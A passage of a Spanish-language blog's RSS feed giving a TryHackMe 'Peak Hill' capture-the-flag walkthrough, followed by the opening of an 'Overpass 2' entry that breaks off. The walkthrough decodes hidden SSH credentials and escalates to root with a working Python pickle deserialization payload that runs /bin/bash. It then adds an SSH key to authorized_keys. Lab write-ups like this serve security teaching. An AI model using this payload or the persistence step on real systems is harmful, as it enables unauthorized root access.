&lt;span class=&#34;o&#34;&gt;[(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ssh_pass15&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;u&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ssh_user1&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;h&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ssh_user0&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;g&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ssh_pass1&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... REDACTED ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ssh_pass10&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)]&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizamos un script para poder ordenar los datos segun el numero, basta con imprimir los diccionarios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python:OrderPickle.py&#34; data-lang=&#34;python:OrderPickle.py&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pickle&lt;/span&gt;
&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;collections&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;OrderedDict&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;sortByKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dictionary&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt;    
    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;sorted&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;dictionary&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;items&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())))&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;picklefile&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;open&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;possible_pickle&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;rb&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;pickle&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;load&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;picklefile&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;ssh_pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;ssh_user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;dict&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;range&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)):&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ssh_pass&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;ssh_pass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;elif&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ssh_user&amp;#34;&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]:&lt;/span&gt;
		&lt;span class=&#34;n&#34;&gt;ssh_user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
	&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
		&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;None&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sortByKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ssh_user&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sortByKey&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ssh_pass&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;gherkin---user&#34;&gt;GHERKIN - USER&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales que obtuvimos, en el servicio ssh y logramos obtener una shell.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/Screenshot_2020-08-16_19-30-29.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;dill---user&#34;&gt;DILL - USER&lt;/h2&gt;
&lt;p&gt;En el directorio principal del usuario encontramos un archivo &lt;code&gt;.pyc&lt;/code&gt; el cual trasladamos a nuestra maquina para obtener el codigo fuente utilizando &lt;a href=&#34;https://github.com/rocky/python-uncompyle6/&#34;&gt;&lt;strong&gt;uncompyle6&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/Screenshot_2020-08-16_19-46-55.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;El codigo fuente o script real nos muestra que es un servidor con su puerto y una funcion en donde se pueden ejecutar comandos, pero es necesario ingresar credenciales, tambien vemos las credenciales las cuales estan &amp;ldquo;convertidas a numeros&amp;rdquo;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REDACTED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2457&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REDACTED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2356&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Revisamos si este script se estaba ejecutando en la maquina y vemos en proceso el script el cual lo ejecuta &lt;code&gt;Dill&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/Screenshot_2020-08-16_19-54-44.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Utilizamos las misma libreria (&lt;code&gt;Crypto.Util.number&lt;/code&gt;) para obtener las credenciales reales.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Util.number&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bytes_to_long&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REDACTED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;36&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;
&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;dill&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;long_to_bytes&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2457&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;REDACTED&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2356&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;
&lt;span class=&#34;sa&#34;&gt;b&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;n[... REDACTED ...]t&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Nos conectamos al puerto y utilizamos las credenciales, logramos ejecutar comandos. Intentamos autenticarnos en la sesion de SSH que teniamos pero al parecer no es la misma contraseña.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/Screenshot_2020-08-16_19-55-30.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien logramos obtener nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/Screenshot_2020-08-16_19-59-15.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En la carpeta principal de &lt;code&gt;Dill&lt;/code&gt; encontramos su clave privada para poder ingresar por medio del servicio SSH.&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Hacemos una pequeña enumeracion con &lt;code&gt;sudo -l -l&lt;/code&gt; y vemos que tenemos permisos root (sudo) para ejecutar el archivo &lt;code&gt;/opt/peak_hill_farm/peak_hill_farm&lt;/code&gt;. Al ejecutar dicho archivo nos pide algo, al ingresar cualquier cosa nos devuelve un error, despues de multiples intentos nos devolvio el mensaje &lt;code&gt;failed to decode base64&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/Screenshot_2020-08-16_20-46-42.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Ingresamos un mensaje codificado pero no lo aceptó, intentamos mover el archivo a nuestra maquina pero no nos deja copiar o mover el archivo.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/Screenshot_2020-08-16_20-48-16.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;En el script nos habla de &lt;code&gt;Peak Hill Farm&lt;/code&gt; tal vez se refiera nuevamente a pickle, como el archivo que encontramos en el servicio de &lt;a href=&#34;https://sckull.github.io/posts/peakhill/#ftp&#34;&gt;&lt;strong&gt;FTP&lt;/strong&gt;&lt;/a&gt;. Creamos un payload que nos va permitir ejecutar &lt;code&gt;bash&lt;/code&gt; para obtener una shell root. &lt;a href=&#34;https://davidhamann.de/2020/04/05/exploiting-python-pickle/&#34;&gt;&lt;strong&gt;Ver Pickle RCE&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&amp;gt;&amp;gt;&amp;gt; import cPickle, base64, os, sys
&amp;gt;&amp;gt;&amp;gt; 
&amp;gt;&amp;gt;&amp;gt; class Exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;object&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
...     def __init__&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;self, cmd&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
...         self.cmd &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; cmd
...     def __reduce__&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;self&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
...         &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;os.system, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;self.cmd,&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt;
... 
&amp;gt;&amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;cmd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;/bin/bash&amp;#34;&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; &lt;span class=&#34;nv&#34;&gt;exploit&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; base64.b64encode&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cPickle.dumps&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Exploit&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;cmd&lt;span class=&#34;o&#34;&gt;)))&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt; exploit
&lt;span class=&#34;s1&#34;&gt;&amp;#39;Y3Bvc2l4CnN5c3RlbQpwMQooUycvYmluL2Jhc2gnCnAyCnRScDMKLg==&amp;#39;&lt;/span&gt;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Logramos obtener una shell root.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/Screenshot_2020-08-16_21-15-54.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Por alguna razon no logramos realizarle un &lt;code&gt;cat&lt;/code&gt; al la flag root.txt por lo que agregamos clave de ssh al archivo &lt;code&gt;authorized_keys&lt;/code&gt; para poder ingresar por este servicio y lograr leer nuestra flag.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/Screenshot_2020-08-16_21-21-45.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al parecer el archivo tiene dos espacios a los lados (del nombre).&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/thm/peakhill/Screenshot_2020-08-16_21-24-40.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/thm/peakhill/cover.png" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/thm/peakhill/cover.png" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>tryhackme</category>
            
          
        
        
      </item>
      
      <item>
        <title>TryHackMe - Overpass 2 - Hacked</title>
        <link>https://sckull.github.io/posts/overpasstwo/</link>
        <pubDate>Fri, 14 Aug 2020 00:00:00 +0000</pubDate>
        
        <atom:modified>Fri, 14 Aug 2020 00:00:00 +0000</atom:modified>
        <guid>https://sckull.github.io/posts/overpasstwo/</guid>
        <description>Overpass 2 - Hacked es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.</description>
        <content:encoded>&lt;p&gt;Overpass 2 - Hacked es una maquina de TryHackMe aqui encontrarás la solucion para obtener la flag user.txt y root.txt.&lt;/p&gt;




  



  &lt;div class=&#34;featured-image__wrapper&#34;&gt;
    &lt;img src=&#34;https://sckull.github.io/images/posts/thm/overpasstwo/cover.png&#34; alt=&#34;featured image&#34; class=&#34;featured-image&#34; style=&#34;width: ;height: ;&#34;&gt;
  &lt;/div&gt;

&lt;h3 id=&#34;informacion-de-la-maquina&#34;&gt;Informacion de la Maquina&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Titulo&lt;/th&gt;
&lt;th&gt;Overpass 2 - Hacked&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Info&lt;/td&gt;
&lt;td&gt;Overpass has been hacked! Can you analyse the attacker&amp;rsquo;s actions and hack back in?&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Puntos&lt;/td&gt;
&lt;td&gt;*&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Dificultad&lt;/td&gt;
&lt;td&gt;Facil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Maker&lt;/td&gt;
&lt;td&gt;&lt;a href=&#34;https://tryhackme.com/p/NinjaJc01&#34;&gt;NinjaJc01&lt;/a&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
